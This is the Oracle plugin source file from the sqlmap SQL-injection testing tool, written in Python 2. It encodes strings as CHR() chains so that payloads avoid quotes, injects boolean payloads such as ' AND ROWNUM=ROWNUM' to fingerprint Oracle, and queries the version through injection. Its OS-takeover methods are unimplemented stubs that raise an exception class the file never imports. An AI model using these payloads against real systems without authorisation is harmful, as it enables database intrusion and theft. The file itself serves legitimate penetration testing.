#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapSyntaxException
from lib.core.session import setDbms
from lib.core.settings import ORACLE_ALIASES
from lib.core.settings import ORACLE_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class OracleMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines Oracle methods
    """


    def __init__(self):
        self.excludeDbsList = ORACLE_SYSTEM_DBS

        Enumeration.__init__(self, "Oracle")
        Filesystem.__init__(self)
        Takeover.__init__(self)

        unescaper.setUnescape(OracleMap.unescape)


    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                #unescaped = "("
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "CHR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "||"

                #unescaped += ")"
                expression = expression.replace(old, unescaped)
        else:
            expression = "||".join("CHR(%d)" % ord(c) for c in expression)

        return expression


    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find("))")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.replace("CHR(", "").replace(")", "")
            oldUpper = oldUpper.split("||")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression


    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "Oracle"
            return value

        actVer      = formatDBMSfp()
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value


    def checkDbms(self):
        if conf.dbms in ORACLE_ALIASES:
            setDbms("Oracle")

            self.getBanner()

            if not conf.extensiveFp:
                return True

        logMsg = "testing Oracle"
        logger.info(logMsg)

        payload = agent.fullPayload(" AND ROWNUM=ROWNUM")
        result  = Request.queryPage(payload)

        if result == True:
            logMsg = "confirming Oracle"
            logger.info(logMsg)

            payload = agent.fullPayload(" AND LENGTH(SYSDATE)=LENGTH(SYSDATE)")
            result  = Request.queryPage(payload)

            if result != True:
                warnMsg = "the back-end DMBS is not Oracle"
                logger.warn(warnMsg)

                return False

            setDbms("Oracle")

            self.getBanner()

            if not conf.extensiveFp:
                return True

            query = "SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1"
            version = inject.getValue(query, unpack=False)

            if re.search("^11", version):
                kb.dbmsVersion = ["11i"]
            elif re.search("^10", version):
                kb.dbmsVersion = ["10g"]
            elif re.search("^9", version):
                kb.dbmsVersion = ["9i"]
            elif re.search("^8", version):
                kb.dbmsVersion = ["8i"]

            return True
        else:
            warnMsg = "the back-end DMBS is not Oracle"
            logger.warn(warnMsg)

            return False


    def forceDbmsEnum(self):
        if conf.db:
            conf.db = conf.db.upper()
        else:
            conf.db = "USERS"

            warnMsg  = "on Oracle it is only possible to enumerate "
            warnMsg += "if you provide a TABLESPACE_NAME as database "
            warnMsg += "name. sqlmap is going to use 'USERS' as database "
            warnMsg += "name"
            logger.warn(warnMsg)

        if conf.tbl:
            conf.tbl = conf.tbl.upper()


    def getDbs(self):
        warnMsg = "on Oracle it is not possible to enumerate databases"
        logger.warn(warnMsg)

        return []


    def readFile(self, rFile):
        errMsg  = "File system read access not yet implemented for "
        errMsg += "Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg


    def writeFile(self, wFile, dFile, fileType=None, confirm=True):
        errMsg  = "File system write access not yet implemented for "
        errMsg += "Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg


    def osCmd(self):
        errMsg  = "Operating system command execution functionality not "
        errMsg += "yet implemented for Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg


    def osShell(self):
        errMsg  = "Operating system shell functionality not yet "
        errMsg += "implemented for Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg


    def osPwn(self):
        errMsg  = "Operating system out-of-band control functionality "
        errMsg += "not yet implemented for Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg


    def osSmb(self):
        errMsg  = "One click operating system out-of-band control "
        errMsg += "functionality not yet implemented for Oracle"
        raise sqlmapUnsupportedFeatureException, errMsg
